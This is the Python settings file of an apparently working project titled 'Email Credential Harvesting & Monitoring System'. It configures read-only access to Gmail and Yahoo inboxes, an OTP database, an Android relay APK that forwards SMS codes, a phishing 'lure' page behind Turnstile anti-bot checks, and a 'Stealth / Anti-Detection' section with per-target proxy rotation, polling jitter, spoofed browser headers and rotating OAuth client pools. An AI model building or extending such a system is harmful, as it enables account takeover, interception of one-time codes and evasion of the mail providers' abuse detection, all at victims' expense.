from pydantic_settings import BaseSettings, SettingsConfigDict
from typing import List
import json


class Settings(BaseSettings):
    model_config = SettingsConfigDict(
        env_file=".env",
        env_file_encoding="utf-8",
        case_sensitive=True,
    )

    # --- Core ---
    PROJECT_NAME: str = "Email Credential Harvesting & Monitoring System"
    API_V1_STR: str = "/api/v1"
    LOG_LEVEL: str = "INFO"

    # --- Database (async driver) ---
    DATABASE_URL: str = "postgresql+asyncpg://postgres:password@localhost:5432/otp_system"

    # --- Redis ---
    REDIS_URL: str = "redis://localhost:6379/0"

    # --- Security ---
    SECRET_KEY: str = "CHANGE_ME_generate_a_real_secret_key"
    ENCRYPTION_KEY: str = "CHANGE_ME_generate_a_real_fernet_key"

    # --- CORS ---
    # Frontend dev origin + your production domain. The Android relay app POSTs
    # from a non-browser client (OkHttp) so CORS does not apply to it, but a
    # browser-based dashboard / install portal does need these origins allowed.
    # Override via CORS_ORIGINS env (JSON array string) when you deploy.
    CORS_ORIGINS: str = '["http://localhost:3000", "https://your-domain.com"]'

    @property
    def cors_origins_list(self) -> List[str]:
        return json.loads(self.CORS_ORIGINS)

    # --- Gmail OAuth 2.0 ---
    GMAIL_CLIENT_ID: str = ""
    GMAIL_CLIENT_SECRET: str = ""
    GMAIL_REDIRECT_URI: str = "http://localhost:8000/api/v1/oauth/gmail/callback"
    GMAIL_SCOPES: List[str] = [
        "https://www.googleapis.com/auth/gmail.readonly",
    ]

    # --- Yahoo OAuth 2.0 ---
    YAHOO_CLIENT_ID: str = ""
    YAHOO_CLIENT_SECRET: str = ""
    YAHOO_REDIRECT_URI: str = "http://localhost:8000/api/v1/oauth/yahoo/callback"

    # --- Monitoring ---
    POLLING_INTERVAL_SECONDS: int = 30
    MAX_CONSECUTIVE_FAILURES: int = 5
    
    # --- SMS / Twilio ---
    TWILIO_ACCOUNT_SID: str = ""
    TWILIO_AUTH_TOKEN: str = ""
    TWILIO_PHONE_NUMBER: str = ""
    SMS_WEBHOOK_SECRET: str = ""
    # Shared secret for the Android relay app. Generate with:
    #   python -c "import secrets; print(secrets.token_hex(16))"
    # Bake the same value into Config.kt in the relay APK at build time.
    RELAY_APP_SECRET: str = ""

    # --- Stealth / Anti-Detection ---
    # Proxy rotation (format: "http://user:pass@host:port" or "socks5://...")
    PROXY_LIST: str = '[]'
    # Per-target proxy assignment: "round_robin" | "sticky" | "random"
    PROXY_STRATEGY: str = "sticky"
    
    # Jitter configuration
    POLLING_JITTER_PERCENT: float = 0.25  # ±25% variance
    MIN_POLLING_INTERVAL: int = 15  # floor after jitter
    
    # Browser fingerprint spoofing
    SPOOF_USER_AGENT: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    SPOOF_ACCEPT_LANGUAGE: str = "en-US,en;q=0.9"
    SPOOF_ACCEPT_ENCODING: str = "gzip, deflate, br"
    
    # OAuth client rotation (comma-separated client_id:client_secret pairs)
    GMAIL_CLIENT_POOL: str = ""
    YAHOO_CLIENT_POOL: str = ""
    
    # IMAP IDLE support
    USE_IMAP_IDLE: bool = True
    IMAP_IDLE_TIMEOUT: int = 1800  # 30 min max idle
    
    # Rate limit handling
    RESPECT_RETRY_AFTER: bool = True
    MAX_RETRIES_ON_429: int = 3
    
    # Lure anti-bot
    ENABLE_TURNSTILE: bool = False
    TURNSTILE_SITE_KEY: str = ""
    TURNSTILE_SECRET_KEY: str = ""


settings = Settings()
